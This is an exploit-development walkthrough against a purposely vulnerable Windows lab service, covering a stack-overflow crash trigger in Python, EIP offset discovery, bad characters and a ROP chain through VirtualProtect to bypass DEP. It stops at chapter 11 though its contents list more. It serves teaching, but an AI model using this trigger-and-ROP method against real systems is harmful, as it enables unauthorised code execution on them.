# VulnSvc: A Complete DEP-Bypass Walkthrough

**From source, to crash, to a working ROP exploit — earning every decision.**

This is a full-length exploit-development walkthrough against `service.exe`, the
deliberately vulnerable 32-bit Windows service you built in `BUILD.md`. It is
written to teach *judgement*, not to hand you a finished script. Every gadget is
earned through an explicit sequence: **problem → reasoning → search → candidate
gadgets → rejected alternatives → chosen gadget → verify → observe stack state →
repeat.** By the time you reach the appendix, the complete chain should feel
inevitable rather than magical.

### How to read this

- **Design decision** boxes mark forks in the road and explain the choice.
- **Verify in WinDbg** boxes give the exact commands to confirm each step on
  *your* build.
- Addresses shown in narrative (e.g. `compression+0x1234`) are from **one
  reference build**. Yours will differ — the whole point of building it yourself
  is that you rederive them with the exact `findstr` searches shown. A fill-in
  **Gadget Table** (Appendix A) and `exploit/exploit.py` are structured so your
  addresses drop straight in.

### Toolchain assumed

WinDbg, `rp++` (`rp-win-x86.exe`), the Narly extension, Python 3 for the
exploit, `msfvenom`/`msf-pattern_*` from Metasploit. A throwaway Windows VM.

---

## Table of contents

1. [Reconnaissance: what are we attacking?](#ch1)
2. [Finding the bug: follow bytes, not function names](#ch2)
3. [Choosing a gadget source: which module?](#ch3)
4. [Triggering the crash](#ch4)
5. [Controlling EIP: offset and register survey](#ch5)
6. [Bad characters](#ch6)
7. [Proving DEP, and why `jmp esp` is dead](#ch7)
8. [Strategy: the fake frame and the plan](#ch8)
9. [Building the VirtualProtect chain, primitive by primitive](#ch9)
10. [Firing the call and the "don't debug two problems" discipline](#ch10)
11. [Landing real shellcode](#ch11)
12. [Chapter 2 API: VirtualAlloc](#ch12)
13. [Chapter 3 API: WriteProcessMemory](#ch13)
14. [What ASLR would have broken](#ch14)
15. [Appendix A: gadget table (fill-in)](#appA)
16. [Appendix B: the complete annotated chain](#appB)
17. [Appendix C: challenges](#appC)

---

<a name="ch1"></a>
## 1. Reconnaissance: what are we attacking?

Before a single packet, characterise the target statically and at runtime. You
are answering four questions: *What speaks? What mitigations are in force? What
modules share the address space? What do they import?*

### 1.1 The process and its modules

Start the service, attach WinDbg, and list modules:

```
0:000> lm
start    end        module
00400000 00460000   service          <- the vulnerable EXE, base 0x00400000
61500000 61560000   compression      <- no ASLR (we'll confirm)
62000000 62030000   helper           <- ASLR on (we'll confirm)
63000000 63020000   crypto
64000000 64030000   network
7xxxxxxx ...        ntdll, kernel32, kernelbase, ws2_32, ...
```

Five application modules in one process. That is your gadget/IAT universe;
system DLLs (ntdll, kernel32) are usually off-limits early because they are
ASLR'd and version-dependent.

### 1.2 Mitigations

```
0:000> .load narly
0:000> !nmod
00400000 00460000 service      /SafeSEH OFF  ...            C:\lab\bin\service.exe
61500000 61560000 compression  /SafeSEH OFF  ...            C:\lab\bin\compression.dll
62000000 62030000 helper       /SafeSEH OFF  *ASLR  ...     C:\lab\bin\helper.dll
63000000 63020000 crypto       /SafeSEH OFF  ...            C:\lab\bin\crypto.dll
64000000 64030000 network      /SafeSEH OFF  ...            C:\lab\bin\network.dll
```

Read this carefully. `helper` carries `*ASLR`; the others do not. Narly reads
the PE header, so DEP enforced via `/NXCOMPAT` may not show here — confirm DEP
empirically (Chapter 7). SafeSEH is off everywhere, which matters only if we go
the SEH route (we don't, in the main line).

> **Verify in WinDbg.** Cross-check statically too:
> `dumpbin /headers bin\helper.dll | findstr /i "dynamic"` should show
> *"Dynamic base"*; the same command on `compression.dll` should not.

### 1.3 Imports — the question nobody asks early enough

A gadget source is far more valuable if it also **imports the API you intend to
call**, because then it hands you a fixed IAT slot to resolve that API at
runtime. Check:

```
0:000> !dh -f compression.dll        (or: dumpbin /imports bin\compression.dll)
   ... Import Address Table ...
   KERNEL32!VirtualAlloc
   KERNEL32!VirtualProtect
   KERNEL32!HeapAlloc
   KERNEL32!VirtualFree
   ...
```

`compression.dll` imports **both** `VirtualAlloc` and `VirtualProtect` — because
its worker legitimately allocates and reprotects a scratch arena. Note this;
it decides a lot in Chapter 3.

By contrast:

```
dumpbin /imports bin\network.dll  | findstr /i Virtual   ->  (nothing)
dumpbin /imports bin\crypto.dll   | findstr /i Virtual   ->  (nothing)
```

Neither noise DLL imports a protection API.

---

<a name="ch2"></a>
## 2. Finding the bug: follow bytes, not function names

The wrong way to find this bug is to grep for `sscanf`, `strcpy`, `memcpy` and
start reading. That habit fails on real targets, where dangerous-looking calls
are usually safe and the exploitable one looks mundane. The right lens is
**attacker-controlled dataflow**:

```
Where does external input enter?
        ↓
How is it parsed / transformed?
        ↓
Where is it copied or formatted?
        ↓
What memory object receives it?
        ↓
Is the destination bounded?
        ↓
Can a valid packet actually reach that path?
```

Work it in three passes.

### 2.1 Pass 1 — reachability

Trace a packet from the socket to a handler. In `dispatch.c`:

```
recv header → validate magic → bound body_len ≤ 0x2000 → recv body → NUL-terminate
        ↓
switch (opcode):
    OP_PING/AUTH/STATUS/CONFIG_GET/CONFIG_SET/LOG_UPLOAD/COMPRESS/STATS/QUIT
```

Two reachability facts jump out:

- **`body_len` is capped at `0x2000` on the wire**, far larger than any small
  stack buffer downstream. The transport is not the guard.
- **`OP_CONFIG_SET` is reachable, but its handler checks `c->authenticated`
  first.** So the vulnerable path (whatever it is) requires a prior successful
  `OP_AUTH`. That is realistic gating, not a dead end — you can authenticate.

### 2.2 Pass 2 — taint flow

Follow the body bytes into the handlers that copy them. Three parsers in
`parser.c` all take attacker bytes:

```
body ──▶ parse_status_query()   sscanf(body, "module=%63s", module[64])
body ──▶ parse_log_upload()     memcpy(log_name[128], body, len)   [len checked]
body ──▶ parse_config_set()     sscanf(body, "%31s %63s %s", command, name, value)
```

### 2.3 Pass 3 — constraint analysis (the part that actually decides)

Do **not** stop at "sscanf → suspicious". Read the widths and checks.

```
parse_status_query   "module=%63s"  → 63-char cap into a 64-byte buffer   SAFE
parse_log_upload     memcpy(len)     → `if (len >= sizeof(log_name)) return` SAFE
parse_config_set     "%31s %63s %s"  → third token has NO WIDTH LIMIT       BUG
```

The first two are textbook dead ends: one *looks* like the classic vulnerable
`sscanf %s` but is width-limited; the other *looks* like a raw attacker-bytes
`memcpy` but is length-checked first. The third looks the most innocuous from
the dispatcher, yet its final `%s` writes into the 256-byte stack buffer `value`
with no bound.

> **Design decision — the transferable rule.** The bug is not "sscanf is
> dangerous." The bug is: *attacker-controlled input, copied into a fixed-size
> stack buffer, through an unbounded conversion, on a reachable path.* All four
> clauses must hold. `parse_config_set` is the only place they all do.

The vulnerable frame therefore belongs to `parse_config_set`. When it returns to
`handle_config_set`, the saved return address it pops is the one your long third
token overwrote.

> **Verify in disassembly (source-free skill).** Even with the source in hand,
> practise recovering this from the binary. In WinDbg:
> `x service!parse_config_set` then `uf service!parse_config_set`. Find the
> `call ... sscanf`, note the three `lea` of stack locals passed as args, and
> observe there is no `__security_check_cookie` in the epilogue (we built
> `/GS-`). No cookie means a smashed return address is used directly.

---

<a name="ch3"></a>
## 3. Choosing a gadget source: which module?

This is the highest-leverage decision in the whole exploit, and the one most
tutorials skip by simply announcing a module. Do not accept a module; *derive*
it. You have five candidates. Score each against three requirements:

1. **Predictable base** — no ASLR, or you cannot hardcode gadget addresses.
2. **Bad-char-free addresses** — every gadget address you use travels through
   the vulnerable `%s`, so it must avoid the bad-char set (Chapter 6: notably
   `0x00`).
3. **Imports the API you'll call** — so you get a fixed IAT slot to resolve it.

### 3.1 The elimination

**`service.exe` — REJECTED (bad-char addresses).** No ASLR, tempting. But its
image base is `0x00400000` and it spans `0x00400000–0x0045ffff`. *Every* address
in it has a `0x00` high byte:

```
0x0041F210  →  bytes 10 F2 41 00   (little-endian on the wire: 10 F2 41 00)
0x0045A012  →  bytes 12 A0 45 00
```

`0x00` is a bad character (it terminates the `%s`). Try three gadget addresses
and you will notice the pattern: they all start with `00`. You cannot source a
single gadget from the main executable. *(This is exactly the FastBack lesson —
the vulnerable EXE at `0x00400000` is unusable, forcing you to a DLL.)*

**`helper.dll` — REJECTED (ASLR).** You will find it first and love it: clean
`pop eax ; ret`, `mov [esi], eax ; ret`, `xchg eax, ebp ; ret`. Then you restart
the service and every address moved:

```
run 1:  helper base 0x62000000   gadget 0x6200A1B0
run 2:  helper base 0x008E0000   gadget 0x008EA1B0   ← moved
```

Gadget quality is irrelevant if you cannot predict the base. Reject on ASLR
alone. **Lesson: quality never overrides predictability.**

**`crypto.dll` — REJECTED (thin, no useful imports).** No ASLR, fixed base — so
far so good. But it is a small `/Od` build: poor gadget density, and it imports
no `VirtualAlloc`/`VirtualProtect`, so it gives you no IAT slot to resolve your
API. Necessary properties present, sufficient ones absent.

**`network.dll` — VIABLE BUT INFERIOR.** No ASLR, `/O2`, genuinely decent
gadgets and a predictable base. The catch is imports: it pulls in `ws2_32`
(recv/send/htons) but **not** a protection API. You *could* use it purely for
gadgets and borrow the IAT slot from another module — but now you are juggling
two modules for gadgets vs. IAT resolution. More moving parts, no benefit.

**`compression.dll` — CHOSEN.**

```
✓ No ASLR (base fixed at 0x61500000)
✓ Addresses start 0x61.. / 0x615x.. → no 0x00, no 0x0a/0x0d/0x20 in the high byte
✓ Imports BOTH VirtualAlloc and VirtualProtect → fixed IAT slots for either API
✓ /O2 build with checksum/compression byte-loops → excellent gadget density
```

### 3.2 The decision, as a table

| Module | No ASLR | Bad-char-free addrs | Imports VA/VP | Gadget density | Verdict |
|---|---|---|---|---|---|
| service.exe | ✓ | ✗ (`0x00` high byte) | — | ok | **reject** |
| helper.dll | ✗ (ASLR) | ✓ | ✓ | excellent | **reject** |
| crypto.dll | ✓ | ✓ | ✗ | poor | **reject** |
| network.dll | ✓ | ✓ | ✗ | good | viable, inferior |
| **compression.dll** | ✓ | ✓ | ✓ | excellent | **CHOSEN** |

> **Design decision.** You did not learn *which* module to use — you learned
> *how to choose one*. On the next Windows target the modules change; the
> scoring does not. Module selection is a decision you make on nearly every
> Windows exploit, whereas the exact gadgets change every binary. This is the
> more valuable skill.

Generate gadgets from the winner:

```
copy bin\compression.dll .
rp-win-x86.exe -f compression.dll -r 5 > rop.txt
```

`-r 5` caps gadgets at five instructions; longer ones almost always drag in a
`call`/`jmp` that breaks the chain.

---

<a name="ch4"></a>
## 4. Triggering the crash

Now make the service die on demand. You need a valid header, an authenticated
session, then an over-long `OP_CONFIG_SET` body.

The frame is `[magic u32][opcode u16][flags u16][body_len u32][body]`. A minimal
Python trigger (full version in `exploit/exploit.py`):

```python
import socket, struct

MAGIC = 0x53564C56
def frame(opcode, body, flags=0):
    return struct.pack("<IHHI", MAGIC, opcode, flags, len(body)) + body

s = socket.create_connection(("192.168.x.x", 9999))
s.sendall(frame(0x0002, b"USER researcher\n"))   # OP_AUTH  → sets authenticated
s.recv(512)
body = b"set name " + b"A" * 2000                # OP_CONFIG_SET, huge 3rd token
s.sendall(frame(0x0021, body))
s.recv(512)
```

Attach WinDbg to `service.exe` first (`g` to let it run), then fire. The token
after `set name ` lands in `value[256]`, overruns it, and smashes the saved
return address of `parse_config_set`.

```
(xxxx.xxxx): Access violation - code c0000005 (first chance)
eip=41414141 esp=0133e320 ebp=41414141
41414141 ??              ???
```

`eip=41414141`. Straight EIP control, no SEH needed. If instead you see a cookie
crash (`__report_gsfailure`), you built with `/GS` on — rebuild `/GS-`.

> **Design decision — why authenticate?** The `c->authenticated` gate is not an
> obstacle to remove; it is a reachability *condition* to satisfy. `OP_AUTH`
> with any non-empty username flips it. Skipping it makes the vulnerable handler
> return `ST_NOAUTH` before reaching the parser — you would be fuzzing a dead
> path. Recognising required preconditions is core triage.

---

<a name="ch5"></a>
## 5. Controlling EIP: offset and register survey

Replace the `A`s with a cyclic pattern to find the exact distance to EIP.

```
msf-pattern_create -l 2000
```

Send it as the third token. On the crash:

```
eip=6a413969 esp=0133e320 ...
```

```
msf-pattern_offset -q 6a413969
[*] Exact match at offset 272
```

So **272 bytes** of the third token precede the 4 bytes that land in EIP. (Your
number depends on frame layout — the compiler decides where `value`, `name`,
`command`, and the saved return address sit. Recover it, do not assume it.)

Now survey every register and the stack at the moment of the fault — this
dictates your whole strategy:

```
0:000> r
eax=00000000 ebx=... ecx=... edx=...
esi=... edi=... eip=42424242 esp=0133e320 ebp=41414141
0:000> dds esp L8
0133e320  43434343
0133e324  43434343
...
```

Questions to answer and write down:

- **Where does ESP point relative to your buffer?** Send `offset*A + BBBB +
  CCCC...` and check whether ESP points at your `C`s. In VulnSvc, ESP lands just
  past the saved EIP, so your ROP chain can begin immediately after the 4 EIP
  bytes — no extra padding. (Confirm on your build.)
- **Do any registers already point into your buffer?** Sometimes ESI/EAX hold a
  pointer you can reuse. Note it; it can save gadgets later.

> **Verify in WinDbg.** With `offset = "A"*272`, `eip = "BBBB"`, `rop = "C"*400`:
> confirm `eip=42424242` and `dds esp` shows `43434343`. That proves ESP is
> chained to controllable data — the precondition for ROP.

Lay the skeleton into the exploit:

```python
offset = b"A" * 272
eip    = b"BBBB"          # to be replaced by the first ROP gadget
rop    = b"C" * (0x400 - 272 - 4)
```

---

<a name="ch6"></a>
## 6. Bad characters

The overflow flows through `sscanf("... %s", value)`. `%s` terminates on
whitespace or NUL, so those bytes cannot appear anywhere in your payload —
including inside gadget addresses.

Derive the set from the conversion, not by rote:

```
0x00  NUL          terminates the C string / %s
0x09  \t  tab      whitespace → ends the %s token
0x0a  \n  LF        whitespace
0x0b  \v  VT        whitespace
0x0c  \f  FF        whitespace
0x0d  \r  CR        whitespace
0x20  ' ' space     whitespace → ends the %s token
```

Bad-char set: **`00 09 0a 0b 0c 0d 20`**.

Confirm empirically: send `set name ` + a byte array `\x01\x02...\xff` (omitting
`0x00`), then inspect the landed bytes in memory (`db`) and see where the string
got truncated or mangled. Every byte that fails to appear intact is bad.

> **Design decision.** Bad chars constrain *two* things: the shellcode (handle
> with `msfvenom -b`) **and every gadget address**. When you picked
> `compression.dll` in Chapter 3, "addresses free of `00/0a/0d/20`" was one of
> the scoring criteria — this is why. A gadget at `0x6150200a` is unusable
> (`0x0a`); you would pick a different gadget for that primitive.

---

<a name="ch7"></a>
## 7. Proving DEP, and why `jmp esp` is dead

Before building ROP, prove to yourself that the classic technique is actually
blocked here — understanding *why* motivates the whole chain.

Pre-DEP, you would drop shellcode on the stack and redirect EIP to a `jmp esp`
in some module. Try the essence of that and watch it fail:

```
0:000> !vprot esp
    BaseAddress:  0133e000
    Protect:      00000004  PAGE_READWRITE          ← writable, NOT executable
0:000> ed esp 90909090        ; write NOPs on the stack
0:000> r eip = esp            ; point EIP at them
0:000> p
(xxxx.xxxx): Access violation - code c0000005      ← DEP blocks execution
0133e320 90              nop
```

The page is `PAGE_READWRITE`. The CPU's NX bit refuses to execute it. Because we
compiled `service.exe` `/NXCOMPAT`, DEP is **on and permanent** for the process —
you cannot flip it off with `NtSetInformationProcess`. The only path is to make a
page executable through a legitimate API, using code that already exists. That is
ROP.

> **If DEP were *not* compiled in** (a `/NXCOMPAT`-less target), you would enable
> it externally to practise: Windows Security → App & browser control → Exploit
> protection → Program settings → add `service.exe` → override **DEP = On**, then
> restart. Narly still won't show it (it reads the header), so you would confirm
> with the NOP-on-stack test above. Here `/NXCOMPAT` already did it for you.

---

<a name="ch8"></a>
## 8. Strategy: the fake frame and the plan

Our goal: call **`VirtualProtect`** to turn the stack page holding our shellcode
from `RW` to `RWX`, then return into the shellcode.

### 8.1 Why VirtualProtect first

> **Design decision — API choice.** The student's mental model of DEP is "this
> page is data; make it code." `VirtualProtect` maps onto that one-to-one:
>
> ```
> shellcode is on the stack  →  stack is RW  →  make it RWX  →  VirtualProtect
> ```
>
> `VirtualAlloc` (Chapter 12) and `WriteProcessMemory` (Chapter 13) reach the
> same end by other means, and both work against this binary (compression.dll
> imports VA and VP). We lead with VirtualProtect because its semantics are the
> most direct expression of the mitigation we are defeating — and because it
> gives a gorgeous debugging checkpoint: `!vprot` shows `PAGE_READWRITE` before
> and `PAGE_EXECUTE_READWRITE` after. You can literally watch DEP fall.

### 8.2 The prototype and the fake frame

```c
BOOL VirtualProtect(
    LPVOID lpAddress,      // page holding shellcode
    SIZE_T dwSize,         // 0x201 is plenty (< one page); any 1..0x1000 works per page
    DWORD  flNewProtect,   // PAGE_EXECUTE_READWRITE = 0x40
    PDWORD lpflOldProtect  // pointer to a WRITABLE dword (receives old protection)
);
```

When you *return into* a function via ROP, the dword at ESP is taken as the
return address and the following dwords as arguments. So you lay a **fake frame**
on the stack:

```
[ &VirtualProtect ]   ← ESP points here when we "return" into VP
[ return address  ]   ← where VP returns → our shellcode
[ lpAddress       ]   ← shellcode address (== return address)
[ dwSize          ]   ← 0x201
[ flNewProtect    ]   ← 0x40
[ lpflOldProtect  ]   ← a writable scratch dword
```

Everything you don't know at build time (VP's runtime address, the shellcode's
stack address) and everything containing bad chars (`0x40`, `0x201`, small
sizes) gets shipped as a **placeholder** and patched in place by ROP.

### 8.3 The one gotcha VirtualAlloc doesn't have

`lpflOldProtect` is an `_Out_` pointer: VP **writes** the previous protection
there. Pass junk and VP faults on the write. It must point at a valid, writable
dword you don't care about. This spawns a small ROP sub-goal — "produce a
writable scratch pointer" — which is good practice.

### 8.4 The plan, organized by primitive

We will build the chain as a sequence of named primitives, not a flat list:

```
P0  Acquire a stack pointer          (copy ESP → working register)
P1  Resolve VirtualProtect from IAT  (deref the fixed IAT slot)
P2  Store API address into frame
P3  Store return address (= shellcode)
P4  Store lpAddress      (= shellcode)
P5  Store dwSize         (0x201)
P6  Store flNewProtect   (0x40)
P7  Store lpflOldProtect (writable scratch)
P8  Pivot ESP onto the fake frame and fire
```

Each primitive below follows the same ritual: state the problem, search rp++,
list candidates, reject the bad ones with a reason, choose, verify, and show the
stack changing. Let's build.

---

<a name="ch9"></a>
## 9. Building the VirtualProtect chain, primitive by primitive

Throughout, symbolic names like `G_POP_EAX` refer to rows in the **Gadget Table
(Appendix A)** that you fill from *your* `rop.txt`. Reference-build addresses are
shown for concreteness and are labelled `[ref]`.

### P0 — Acquire a stack pointer

**Problem.** We must write six dwords into the fake frame at known stack
addresses. ESP points near them, but we may never clobber ESP (it must keep
pointing at the next gadget). So copy ESP into a register we *can* mangle. Later
primitives store with `mov [esi], eax`, so the pointer should end up in **ESI**.

**Search.**

```
findstr /C:"mov esi, esp" rop.txt
findstr /C:"push esp" rop.txt
```

**Candidates.**

```
A)  push esp ; push eax ; pop edi ; pop esi ; ret      ← ends in ret, ESP→ESI
B)  mov esi, esp ; call eax                             ← REJECT: call breaks chain
C)  push esp ; pop esi ; jmp eax                        ← REJECT: jmp breaks chain
D)  mov esi, esp ; pop ebp ; ret                        ← clean, if present
```

**Rejections.** B ends in `call eax` — execution leaves the chain to wherever EAX
points; we lose control. C ends in `jmp eax` — same problem. Any gadget not
ending in `ret` (or an equivalent controlled return) is disqualified no matter
how perfect its first instruction.

**Chosen.** `A` if `D` isn't available. Walk `A`: `push esp` puts ESP on top;
`push eax` pushes below it; `pop edi` discards EAX-value into EDI; `pop esi`
lands the original ESP into ESI. Net: `ESI = ESP`, and it returns cleanly.

```
eip = pack("<L", G_STACKPTR)     # push esp ; push eax ; pop edi ; pop esi ; ret   [ref] 0x6150__
```

> **Verify in WinDbg.** `bp <G_STACKPTR>`, `g`, single-step to the `ret`, then
> `r esi` — ESI should equal the ESP value at entry. Confirm `dds esi` shows your
> `C`-filler, i.e. ESI points into controllable stack.

### P1 — Resolve VirtualProtect from the IAT

**Problem.** VP's runtime address changes every boot; you cannot hardcode it. But
`compression.dll` imports VP, so the **IAT slot** holding VP's address sits at a
fixed offset in the (non-ASLR) module. Find it once and dereference at runtime.

Find the slot:

```
0:000> dps compression!_imp__VirtualProtect L1
615__XXX  76xxxxxx  KERNEL32!VirtualProtectStub
```

or in IDA: Imports → VirtualProtect → note the IAT address, e.g.
`0x6150A220 [ref]`.

**The bad-char snag.** Suppose the slot is `0x6150A220` — it contains `0x20`
(space), a bad char. Standard fix: ship `slot+1 = 0x6150A221`, load it, then
subtract 1 with a gadget to recover the real slot before dereferencing.

**Search & candidates.**

```
findstr /C:": pop eax ; ret" rop.txt          → G_POP_EAX
findstr /C:": pop ecx ; ret" rop.txt           → G_POP_ECX
findstr /C:": add eax, ecx ; ret" rop.txt      → G_ADD_EAX_ECX
findstr /C:": mov eax, dword [eax] ; ret" rop.txt  → G_DEREF_EAX
```

Reject any `pop eax` variant whose gadget also does something destructive before
the `ret` (e.g. `pop eax ; pop esp ; ret` — clobbers ESP), and any deref gadget
that indexes a register you can't control.

**Chosen sequence.**

```
G_POP_EAX        ; eax = 0x6150A221   (IAT slot + 1, dodges 0x20)
G_POP_ECX        ; ecx = 0xFFFFFFFF   (-1)
G_ADD_EAX_ECX    ; eax = 0x6150A220   (real IAT slot)
G_DEREF_EAX      ; eax = [slot] = &VirtualProtect   ← runtime address resolved
```

> **Verify in WinDbg.** Break after `G_DEREF_EAX`; `u eax L1` should disassemble
> as `KERNEL32!VirtualProtectStub`. If EAX is garbage, your IAT slot or the ±1
> correction is wrong.

### P2 — Store the API address into the frame

**Problem.** EAX now holds `&VirtualProtect`. Write it over the `&VirtualProtect`
placeholder in the fake frame. We need the store primitive and ESI aimed at the
placeholder slot.

**The store primitive (used in P2–P7):**

```
findstr /C:": mov dword [esi], eax ; ret" rop.txt   → G_STORE   [ref] 0x6150CBB6
```

**Aligning ESI.** In P0, ESI = ESP. The fake frame's first slot (`&VP`) sits at a
known offset from ESP (you laid it out; e.g. the placeholder is at `ESP-0x1C`
because you put the frame *before* the chain — exact number from your layout).
To move ESI to it without null bytes, add a negative:

```
G_MOV_EAX_ESI    ; eax = esi            (get a working copy; e.g. "mov eax,esi ; pop esi ; ret")
G_POP_ECX        ; ecx = 0xFFFFFFE4     (-0x1C, null-free)
G_ADD_EAX_ECX    ; eax = &placeholder
G_PUSH_EAX_POP_ESI ; esi = &placeholder ("push eax ; pop esi ; ret")
```

Then, after P1 has resolved VP into EAX again (order your chain so the resolved
value is in EAX when you store — see Appendix B for the exact interleaving):

```
G_STORE          ; [esi] = eax  → placeholder replaced with &VirtualProtect
```

> **Verify in WinDbg — watch the placeholder disappear.**
> ```
> before:  dds esi L1   →  615..  45454545     (placeholder)
> after :  dds esi L1   →  615..  76xxxxxx  KERNEL32!VirtualProtectStub
> ```
> This before/after is the single most satisfying checkpoint in the chain.

### P3 / P4 — Store return address and lpAddress (both = shellcode)

**Problem.** The shellcode will sit *after* the ROP chain, whose length isn't
final until the chain is done — chicken and egg. Solve with a placeholder offset
from ESI you finalise last.

Advance ESI to the return-address slot (4 bytes on): no `add esi,4` gadget?
Use an `inc esi` gadget repeated 4×. Ours has a harmless side effect:

```
findstr /C:": inc esi" rop.txt
    G_INC_ESI  =  inc esi ; add al, 2Bh ; ret     ← ugly, side-effects AL only
```

> **Design decision — ugly gadgets are fine.** `inc esi ; add al,0x2B ; ret` is
> not clean, but the only register it dirties (AL) is one we don't rely on at
> this point. Reject a gadget for *harmful* side effects, not cosmetic ones.
> Chasing the mythical perfect `add esi,4 ; ret` wastes time; this works.

Then compute `ESI + delta` into EAX to point at the (future) shellcode and store:

```
G_INC_ESI ×4                              ; ESI → return-address slot
G_MOV_EAX_ESI                             ; eax = esi
G_PUSH_EAX_POP_ESI (restore later) / arithmetic to add shellcode delta
G_POP_ECX ; 0xFFFFFDF0  (-0x210, null-free placeholder delta)
G_SUB_EAX_ECX  (or add of a negative)     ; eax = shellcode addr (approx)
G_STORE                                   ; [esi] = shellcode addr  (return address)
```

P4 (`lpAddress`) is the *same value* one slot further on: `inc esi ×4`, recompute
(delta now `-0x20C` because ESI advanced 4), `G_STORE`. Finalise the `-0x210` /
`-0x20C` magic numbers in Chapter 11 once the chain length is frozen.

> **Verify.** After P3, `dds` the return-address slot: the `46464646` placeholder
> becomes a stack address inside your buffer. After P4, the `lpAddress` slot
> equals the return-address slot — VP's target page and its return target are the
> same page (correct: we execute the shellcode we just made executable).

### P5 — Store dwSize (0x201)

**Problem.** `0x00000201` has null bytes. Synthesize it null-free.

> **Design decision — which trick?** Three options for building a
> null-containing constant: (a) `neg` of its two's-complement if *that* is
> null-free; (b) split into two null-free addends; (c) build with
> `xor`/`inc`. For `0x201`: `-0x201 = 0xFFFFFDFF` (null-free) → `pop eax ;
> 0xFFFFFDFF ; neg eax` yields `0x201`. One pop, one neg. Choose (a).

```
G_INC_ESI ×4                 ; ESI → dwSize slot
G_POP_EAX ; 0xFFFFFDFF        ; -0x201
G_NEG_EAX                     ; eax = 0x201
G_STORE                       ; [esi] = 0x201
```

(`0x201` > `0x200` avoids a trailing `0x00` low byte you'd get from `0x200`; and
one page of RWX easily covers our shellcode.)

### P6 — Store flNewProtect (0x40)

**Problem.** `0x40` alone is fine, but `0x00000040` as a dword has nulls; and its
two's complement `0xFFFFFFC0` is null-free — so `neg` works again. But let's use
this primitive to teach the **split-add** trick you'll need elsewhere:

```
0x40 = 0x80808080 + 0x7F7F7FC0     (both operands null-free; 32-bit wrap discards carry)
```

```
G_INC_ESI ×4                 ; ESI → flNewProtect slot
G_POP_EAX ; 0x80808080
G_POP_ECX ; 0x7F7F7FC0
G_ADD_EAX_ECX                ; eax = 0x40
G_STORE                      ; [esi] = 0x40  (PAGE_EXECUTE_READWRITE)
```

> **Verify.** `? 80808080 + 7f7f7fc0` in WinDbg → `...00000040`. Watch the
> `51515151` placeholder become `00000040`.

### P7 — Store lpflOldProtect (writable scratch pointer)

**Problem.** VP writes the old protection to `*lpflOldProtect`; the pointer must
be writable. Any stable writable stack dword works. The simplest source: a stack
address we already hold. Reuse ESI-arithmetic to point at a dword we don't care
about (e.g. a slot below our frame that holds filler), and store *that address*
as the argument.

```
G_INC_ESI ×4                 ; ESI → lpflOldProtect slot
G_MOV_EAX_ESI                ; eax = esi (some nearby writable stack addr)
G_POP_ECX ; <null-free delta to a scratch dword>
G_ADD_EAX_ECX                ; eax = &scratch (writable)
G_STORE                      ; [esi] = &scratch
```

> **Design decision.** VirtualProtect's `lpflOldProtect` is the one extra
> argument VirtualAlloc doesn't need. Beginners pass leftover `0x51515151` and
> get an access violation *inside* VP — a confusing crash that looks like the
> chain failed. It didn't; you handed VP an unwritable pointer. Always give it
> real writable storage.

### Chain assembly so far

You now have all six frame fields patched at runtime and a resolved API address.
The frame in memory has transformed from placeholders to a live VirtualProtect
call:

```
BEFORE (as shipped)          AFTER (post-ROP)
45454545  &VP placeholder →  76xxxxxx  KERNEL32!VirtualProtect
46464646  retaddr        →  0133e5xx  (shellcode on stack)
47474747  lpAddress      →  0133e5xx  (same page as retaddr)
48484848  dwSize         →  00000201
51515151  flNewProtect   →  00000040
52525252  lpflOldProtect →  0133e2xx  (writable scratch)
```

Only one thing remains: point ESP at `&VP` and return.

---

<a name="ch10"></a>
## 10. Firing the call and the "don't debug two problems" discipline

### P8 — Pivot ESP onto the fake frame and fire

**Problem.** Execution must "return into" `&VP` with ESP pointing at the frame.
There is rarely a clean `add esp, N`. The usual pivot:

```
findstr /C:": xchg eax, ebp ; ret" rop.txt          → G_XCHG_EAX_EBP
findstr /C:": mov esp, ebp ; pop ebp ; ret" rop.txt  → G_MOV_ESP_EBP
```

Get the address of `&VP`'s slot into EAX (ESI-arithmetic again), then:

```
G_XCHG_EAX_EBP     ; ebp = &frame
G_MOV_ESP_EBP      ; esp = ebp, then pop ebp (eats one dword!) then ret → into &VP
```

**The pivot gotcha.** `mov esp,ebp ; pop ebp ; ret` pops one dword after setting
ESP. So aim EBP **4 bytes before** `&VP`'s slot, so the stray `pop ebp` consumes a
throwaway dword and ESP lands exactly on `&VP`. The final `ret` then enters
VirtualProtect; VP's own `ret 0x10` (stdcall, 4 args × 4 = 0x10) returns into the
dword we stored as the return address — our shellcode page.

> **Verify — watch DEP fall.**
> ```
> 0:000> dds esp L1
> 0133e5xx   (this is the shellcode page we set as lpAddress)
> 0:000> !vprot 0133e5xx
>     Protect: 00000004  PAGE_READWRITE          ← before VP
> 0:000> pt                                       ← step over VirtualProtect
> 0:000> !vprot 0133e5xx
>     Protect: 00000040  PAGE_EXECUTE_READWRITE   ← DEP defeated for this page
> ```

### 10.1 Chapter title: Don't Debug Two Problems at Once

Before you put a single byte of real shellcode in, prove the *ROP* works by
landing on a breakpoint. Stage the payload:

```
Stage 1:  payload = "\xCC" * N          (int3)   → prove control reached RWX memory
Stage 2:  payload = MessageBox shellcode         → prove arbitrary code executes
Stage 3:  payload = launch calc.exe              → a complete, benign exploit
Stage 4:  payload = anything you choose (fits space + bad chars)
```

Workflow:

```
1. Confirm the ROP chain completes (no fault through P8).
2. Confirm page permissions changed (!vprot before/after → RWX).
3. Confirm execution reaches the payload — a debugger break on the FIRST 0xCC.
4. ONLY THEN substitute real shellcode.
```

If your `int3` fires, the DEP bypass is *done*. Any later failure is a
shellcode/space/bad-char problem, not a ROP problem. This separation is the
single biggest time-saver in exploit development: you are never simultaneously
unsure whether the bug is in your chain or your payload.

> **Verify.** With `payload = b"\xCC" * 16`, after P8 you should hit:
> `(xxxx.xxxx): Break instruction exception - code 80000003` at your shellcode
> address. Registers show `eip` inside the (now RWX) stack page. That is a
> proven DEP bypass.

---

<a name="ch11"></a>
## 11. Landing real shellcode

### 11.1 Finalise the shellcode offset

The `-0x210` / `-0x20C` deltas in P3/P4 were placeholders. Now that the chain
length is frozen, measure the true gap. After VP returns and EIP reaches your
`int3` block, in WinDbg:

```
0:000> dd eip L40          ; find where the 0xCC block starts and ends
0:000> ? <cc_start> - <esi_at_store>    ; the real delta from the store point
```

Update the deltas so `lpAddress`/return-address point exactly at the first
shellcode byte. Simpler alternative: leave the deltas approximate and insert
**padding** between the chain and the shellcode so the target lands on a NOP sled
you control. Either works; padding is more forgiving.

### 11.2 Measure available space

```
0:000> dd eip L80          ; how many bytes of RWX runway before it turns to garbage?
0:000> ? <end> - eip
```

